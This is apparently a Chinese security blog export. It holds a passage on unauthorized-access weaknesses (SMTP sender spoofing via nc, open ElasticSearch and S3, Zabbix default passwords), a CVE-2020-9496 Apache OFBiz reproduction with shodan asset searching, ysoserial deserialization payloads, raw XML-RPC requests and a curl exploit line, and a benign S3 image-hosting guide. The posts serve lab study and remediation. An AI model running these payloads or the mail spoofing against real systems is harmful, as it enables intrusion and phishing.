<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mongo --port 27017 -u &quot;accountUser&quot; -p &quot;password&quot; --authenticationDatabase &quot;products&quot;</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h3 id="本节参考链接-1"><a href="#本节参考链接-1" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><ul>
<li><a href="https://www.freebuf.com/vuls/212799.html" target="_blank" rel="noopener">MongoDB未授权访问漏洞分析及整改建议</a></li>
</ul>
<h2 id="邮件服务器未授权访问伪造发件人"><a href="#邮件服务器未授权访问伪造发件人" class="headerlink" title="邮件服务器未授权访问伪造发件人"></a>邮件服务器未授权访问伪造发件人</h2><p>某台邮件服务器25端口开放。</p>
<p>可以直接用nc连接，进行伪造邮件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HELO aaa.com </span><br><span class="line">250 debian</span><br><span class="line">EHLO aaa.com <span class="comment"># 返回250状态码，还返回自己支持各种扩展的列表</span></span><br><span class="line">250 xxxx</span><br><span class="line">250 xxxx </span><br><span class="line">MAIL FROM:admin@admin.com <span class="comment"># 伪造admin发信人</span></span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">RCPT TO:jack@admin.com <span class="comment"># 收信人</span></span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">DATA</span><br><span class="line">------正文------</span><br><span class="line">. <span class="comment"># 结束符</span></span><br><span class="line">250 2.0.0 Ok: queued as C7DE122470</span><br><span class="line">QUIT</span><br><span class="line">221 2.0.0 Bye</span><br></pre></td></tr></table></figure>

<p>完整流程图</p>
<p><img src="https://images.atsud0.me/images/post/image-20201125194127839.png" alt="image-20201125194127839"></p>
<p>其实msf里面也有模块可以直接利用啦</p>
<h2 id="ElasticSearch未授权访问"><a href="#ElasticSearch未授权访问" class="headerlink" title="ElasticSearch未授权访问"></a>ElasticSearch未授权访问</h2><p>默认开放9200端口，用于提供远程管理数据的功能。任何连接到服务器端口上的人，都可以调用相关API对服务器上的数据进行任意的增删改查。</p>
<p>直接访问该端口，出信息就是存在未授权了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.105.25:9200</span><br></pre></td></tr></table></figure>



<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
<li>防火墙限制访问源</li>
<li>在config/elasticsearch.yml中为9200端口设置认证，相关配置参数可参考：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http.basic.enabled true #启动认证，开启会接管全部HTTP连接</span><br><span class="line">http.basic.user "admin" #配置认证账号</span><br><span class="line">http.basic.password "admin_pw" #配置认证密码</span><br><span class="line">http.basic.ipwhitelist [<span class="string">"localhost"</span>, <span class="string">"127.0.0.1"</span>]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证。</li>
</ol>
<h2 id="Amazon-S3-未授权访问"><a href="#Amazon-S3-未授权访问" class="headerlink" title="Amazon S3 未授权访问"></a>Amazon S3 未授权访问</h2><p>这里用了<code>hack the box</code>的<code>bucket</code>靶机来做事例。</p>
<h3 id="aws-cli"><a href="#aws-cli" class="headerlink" title="aws-cli"></a>aws-cli</h3><p>使用aws-cli工具可以直接获取配置错误的bucket桶。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aws s3 ls s3:&#x2F;&#x2F; --no-sign-request --endpoint-url http:&#x2F;&#x2F;s3.bucket.htb</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201123185727734.png" alt="image-20201123185727734"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201123185754857.png" alt="image-20201123185754857"></p>
<h3 id="curl-burp-浏览器"><a href="#curl-burp-浏览器" class="headerlink" title="curl/burp/浏览器"></a>curl/burp/浏览器</h3><p>直接访问 <code>/</code>即可</p>
<p><img src="https://images.atsud0.me/images/post/image-20201123185844024.png" alt="image-20201123185844024"></p>
<p>这里靶机环境不同，需要访问<code>/?1/?</code>但是官方api文档中是直接访问s3服务的根路径，就能获取所有桶了。直接访问<code>/bucket-name/?acl</code></p>
<p><img src="https://images.atsud0.me/images/post/image-20201123190038963.png" alt="image-20201123190038963"></p>
<p>如图所示，目标的acl没被正确配置，可以被未授权用户访问</p>
<h2 id="SpringBoot-Actuator配置不当未授权访问"><a href="#SpringBoot-Actuator配置不当未授权访问" class="headerlink" title="SpringBoot Actuator配置不当未授权访问"></a>SpringBoot Actuator配置不当未授权访问</h2><h3 id="本节参考链接-2"><a href="#本节参考链接-2" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><ul>
<li><p><a href="https://www.freebuf.com/news/193509.html" target="_blank" rel="noopener">Springboot之actuator配置不当的漏洞利用</a></p>
</li>
<li><p><a href="https://xz.aliyun.com/t/2233" target="_blank" rel="noopener">SpringBoot应用监控Actuator使用的安全隐患</a></p>
</li>
<li><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">Exploiting Spring Boot Actuators</a></p>
</li>
<li><p><a href="https://cloud.tencent.com/developer/article/1353426" target="_blank" rel="noopener">SpringCloud组件：你的Eureka服务注册中心安全吗？</a></p>
</li>
<li><p>[Spring Boot Actuators配置不当导致RCE漏洞复现](<a href="https://jianfensec.com/漏洞复现/Spring" target="_blank" rel="noopener">https://jianfensec.com/漏洞复现/Spring</a> Boot Actuators配置不当导致RCE漏洞复现/)</p>
</li>
</ul>
<h2 id="Kubernetes-未授权"><a href="#Kubernetes-未授权" class="headerlink" title="Kubernetes  未授权"></a>Kubernetes  未授权</h2><h3 id="本节参考链接-3"><a href="#本节参考链接-3" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><h2 id="Zabbix控制面板默认口令"><a href="#Zabbix控制面板默认口令" class="headerlink" title="Zabbix控制面板默认口令"></a>Zabbix控制面板默认口令</h2><p>默认管理员账号：zabbix<br>默认管理员密码：zabbix</p>
<p>如果顺利的话，就能直接登陆到zabbix服务端的后台。</p>
<p>游客访问的话没什么用。大部分资源默认配置的都是得管理员账号登陆才能看的到，至少我没看到有一个弱口令的zabbix，游客访问能看到什么东西的。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-9496反序列化漏洞复现</title>
    <url>/2021/01/26/CVE-2020-9496%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>影响范围</p>
<ul>
<li>&lt; 17.12.04版本</li>
</ul>
<p>资产特征</p>
<ul>
<li>Set-Cookie : OFBiz.Visitor</li>
</ul>
<a id="more"></a>

<h2 id="shodan搜索相关资产"><a href="#shodan搜索相关资产" class="headerlink" title="shodan搜索相关资产"></a>shodan搜索相关资产</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shodan search --fields ip_str,port,org,hostnames OFBiz.Visitor</span><br></pre></td></tr></table></figure>
<p>具体就不贴了。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>cve-2020-9496</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">CVE-2020-9496</span></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Apache</span> <span class="string">OFBiz</span> <span class="string">XML-RPC</span> <span class="string">Java</span> <span class="string">Deserialization</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">dwisiswant0</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">medium</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># This temaplte detects a Java deserialization vulnerability in Apache</span></span><br><span class="line">  <span class="comment"># OFBiz's unauthenticated XML-RPC endpoint /webtools/control/xmlrpc for</span></span><br><span class="line">  <span class="comment"># versions prior to 17.12.04.</span></span><br><span class="line">  <span class="comment"># --</span></span><br><span class="line">  <span class="comment"># References:</span></span><br><span class="line">  <span class="comment"># - https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line">        <span class="string">POST</span> <span class="string">/webtools/control/xmlrpc</span> <span class="string">HTTP/1.1</span></span><br><span class="line">        <span class="attr">Host:</span> <span class="string">&#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line">        <span class="attr">Content-Type:</span> <span class="string">application/xml</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&lt;?xml</span> <span class="string">version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;dwisiswant0&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"faultString"</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"No such service [ProjectDiscovery]"</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"methodResponse"</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">and</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"Content-Type: text/xml"</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">header</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure>


<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;https:&#x2F;&#x2F;localhost:8443&quot; | nuclei -t cves&#x2F;CVE-2020-9496.yaml</span><br></pre></td></tr></table></figure>

<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;localhost:8443&#x2F;webtools&#x2F;control&#x2F;xmlrpc -v -X POST -A &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;76.0.3809.132 Safari&#x2F;537.36&#39;  -d &#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;dwisiswant0&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;&#39; -k -H &#39;Content-Type: application&#x2F;xml&#39;</span><br></pre></td></tr></table></figure>

<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 &quot;touch &#x2F;tmp&#x2F;cve-2020-9496&quot; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;dnslog.io&quot; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;webtools&#x2F;control&#x2F;xmlrpc HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8443</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 4093</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;&#x2F;methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;&#x2F;name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns&#x3D;&quot;http:&#x2F;&#x2F;ws.apache.org&#x2F;xmlrpc&#x2F;namespaces&#x2F;extensions&quot;&gt;[base64-payload]&lt;&#x2F;serializable&gt;</span><br><span class="line">            &lt;&#x2F;value&gt;</span><br><span class="line">          &lt;&#x2F;member&gt;</span><br><span class="line">        &lt;&#x2F;struct&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;param&gt;</span><br><span class="line">  &lt;&#x2F;params&gt;</span><br><span class="line">&lt;&#x2F;methodCall&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;localhost:8443&#x2F;webtools&#x2F;control&#x2F;xmlrpc -X POST -v -d &#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;&#x2F;name&gt;&lt;value&gt;&lt;serializable xmlns&#x3D;&quot;http:&#x2F;&#x2F;ws.apache.org&#x2F;xmlrpc&#x2F;namespaces&#x2F;extensions&quot;&gt;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa&#x2F;ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;3QAEWcxNjFjLmwuZG5zbG9nLmlvdAAAcQB+AAV0AARodHRwcHh0ABhodHRwOi8vZzE2MWMubC5kbnNsb2cuaW94&lt;&#x2F;serializable&gt;&lt;&#x2F;value&gt;&lt;&#x2F;member&gt;&lt;&#x2F;struct&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;&#39; -k  -H &#39;Content-Type:application&#x2F;xml&#39;</span><br></pre></td></tr></table></figure>

<h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>msf里面有该反弹shell的exp。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://blog.csdn.net/zy15667076526/article/details/111824473" target="_blank" rel="noopener">Apache OfBiz 反序列化命令执行漏洞（CVE-2020-9496）</a></li>
<li><a href="https://github.com/dwisiswant0/CVE-2020-9496" target="_blank" rel="noopener">CVE-2020-9496</a></li>
<li><a href="https://www.cnblogs.com/ph4nt0mer/p/13576739.html" target="_blank" rel="noopener">CVE-2020-9496 apache ofbiz xml-rpc反序列化漏洞分析 </a></li>
<li><a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Apache%20Ofbiz/%EF%BC%88CVE-2020-9496%EF%BC%89Apache%20Ofbiz%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">Apache Ofbiz 远程命令执行漏洞</a></li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
      <tags>
        <tag>CVE-2020-9496</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Amazon S3实现图床</title>
    <url>/2021/02/24/%E4%BD%BF%E7%94%A8Amazon-S3%E5%AE%9E%E7%8E%B0%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>在用markdown书写时，上传图片稍稍有点不方便，如果图片在本地，上传之后又要改图片的地址。图片不多的时候还好，多起来的时候就很麻烦。。</p>
</blockquote>
<!more>

<p>前提：</p>
<ul>
<li>Mac:Upic(Other OS:PicGo)</li>
<li>Amazon 账号</li>
<li>一个域名 （可选操作)</li>
<li>CloudFlare账号 （可选操作)</li>
</ul>
<h2 id="创建并设置Amazon-S3-Bucket"><a href="#创建并设置Amazon-S3-Bucket" class="headerlink" title="创建并设置Amazon S3 Bucket"></a>创建并设置Amazon S3 Bucket</h2><h3 id="新建Bucket并公开"><a href="#新建Bucket并公开" class="headerlink" title="新建Bucket并公开"></a>新建Bucket并公开</h3><p>名字记得要唯一，记得把”封鎖所有公有存取權的儲存貯體設定”关掉就好了。<br><img src="https://images.atsud0.me/images/post/20210224-10:05:45-_6Mr1XM_sumkm8.jpg" alt=""></p>
<p>接着在你新建的bucket里，建立一个文件夹，并设置为公开。<br><img src="https://images.atsud0.me/images/post/20210224-11:24:39-_JmOhKJ_OphcT1.jpg" alt=""></p>
<p>在这里将images设置为公开后，images下的所有文件，都可以被公共访问。</p>
<h3 id="静态托管-Bucket"><a href="#静态托管-Bucket" class="headerlink" title="静态托管 Bucket"></a>静态托管 Bucket</h3><p>将bucket设置为静态托管，启用静态托管配置功能就好了<br><img src="https://images.atsud0.me/images/post/20210224-11:28:31-_ovpg10_N1HdTK.png" alt=""></p>
<h3 id="新建IAM用户（获取Access-Key-ID和Secret-access-key"><a href="#新建IAM用户（获取Access-Key-ID和Secret-access-key" class="headerlink" title="新建IAM用户（获取Access Key ID和Secret access key"></a>新建IAM用户（获取Access Key ID和Secret access key</h3><p>然后新建一个IAM账号<br><img src="https://images.atsud0.me/images/post/20210224-10:09:10-_h6TJXa_9ULniA.jpg" alt=""></p>
<p>勾选图中的选项，设置好名字后就可以直接下一步了。<br><img src="https://images.atsud0.me/images/post/20210224-10:10:46-_azphSF_bepjL3.png" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/20210224-10:13:47-_x8xmrX_MaHiEK.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/20210224-10:15:14-_s2HIkV_kx3Pv9.jpg" alt=""></p>
<p>记得保存好这里会出现的Access Key ID和Secret access key<br><img src="https://images.atsud0.me/images/post/20210224-10:14:50-_YLz8W3_rDNul7.png" alt=""></p>
<h2 id="下载Upic-amp-配置Upic"><a href="#下载Upic-amp-配置Upic" class="headerlink" title="下载Upic &amp; 配置Upic"></a>下载Upic &amp; 配置Upic</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install upic</span><br></pre></td></tr></table></figure>
<p>或者来github页面上<a href="https://github.com/gee1k/uPic/releases" target="_blank" rel="noopener">upic.dmg</a>下载dmg格式安装。</p>
<p>安装好后到设置页面进行配置<br><img src="https://images.atsud0.me/images/post/20210224-10:19:29-_kdQIRp_Tw8RQf.png" alt=""><br>网站名称没有可不填，直接用亚马逊给的。</p>
<p>填写完毕之后点验证就可以看成功没了。</p>
<p>之后可以在通用页面设置个快捷键，直接一键上传，方便很多。</p>
<p><s>不嫌麻烦的可以用aws cli。（逃</s></p>
<h2 id="配置CloudFront"><a href="#配置CloudFront" class="headerlink" title="配置CloudFront"></a>配置CloudFront</h2><p><a href="https://console.aws.amazon.com/cloudfront/home" target="_blank" rel="noopener">CloudFront</a></p>
<p><img src="https://images.atsud0.me/images/post/20210224-11:32:32-_CiJMPH_Or0HPr.png" alt=""></p>
<p>点建立分布后直接下一步，<br><img src="https://images.atsud0.me/images/post/20210224-11:34:58-_jXOT6k_pj9BUt.png" alt=""></p>
<p>源域名名称，因为刚刚设置了s3的静态托管，所以这里是可以直接选s3 bucket的website页面就好。</p>
<p>CNAME：没有可不写，如果想自定义域名的话就要设置。<strong>如果要自定义域名的话就要自定SSL凭证，要先在ACM中申请凭证后才可以设置</strong>。</p>
<p>SSL证书：默认就可以，<strong>自定义凭证，aws要验证你是域名的所属者才能使用</strong></p>
<p>其他的看着配置就行。</p>
<p>之后就会给分配一个固定cloudfront的域名。</p>
<p>大致上就这么一个结果。<br><img src="https://images.atsud0.me/images/post/20210224-11:42:51-_quZR6u_TbHbhL.jpg" alt=""></p>
<h2 id="ACM申请凭证"><a href="#ACM申请凭证" class="headerlink" title="ACM申请凭证"></a>ACM申请凭证</h2><p><img src="https://images.atsud0.me/images/post/20210224-11:45:43-_xF7zpR_qjHrCM.png" alt=""></p>
<p>选dns验证，如果不能自己设置dns的话就选邮件验证（感觉更快<br><img src="https://images.atsud0.me/images/post/20210224-11:46:10-_pzlXIC_wMaw2b.png" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/20210224-11:46:47-_r5ld43_kOAyqq.png" alt=""></p>
<p>将给的这条CNAME记录在域名服务商中配置，等dns生效就好了。<br><img src="https://images.atsud0.me/images/post/20210224-11:47:56-_aMsl59_fuVTAf.jpg" alt=""></p>
<h2 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h2><p>我是在gandi买的域名，但是用了cloudflare的dns。所以直接在cloudflare上配置。</p>
<p>配置这两条，一条是刚刚在ACM申请中给等CNAME记录（在CloudFlare中要设置成DNS Only，不要弄成了Proxied状态）</p>
<p>另外一条则是将自己个性化域名导向到CloudFront分配的域名。</p>
<p><img src="https://images.atsud0.me/images/post/20210224-11:56:22-_hncBE7_jMsgXt.png" alt=""></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>能正常使用，，0 0<br><img src="https://images.atsud0.me/images/post/20210224-11:59:31-_IJwUxS_Vqotms.png" alt=""></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://troyyang.com/2018/02/16/hosting-images-with-aws-s3/" target="_blank" rel="noopener">正确使用AWS S3的方式之打造自己的https图床</a></li>
<li><a href="https://shisaq.github.io/personal_dev/2020/04/30/amazon-s3-with-upic-picture-bed.html" target="_blank" rel="noopener">用Amazon S3 实现快速上传图床</a></li>
<li><a href="https://leiblog.wang/Upic%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/" target="_blank" rel="noopener">Upic搭建图床</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Amazon-S3-Bucket</tag>
        <tag>others</tag>
      </tags>
  </entry>
</search>
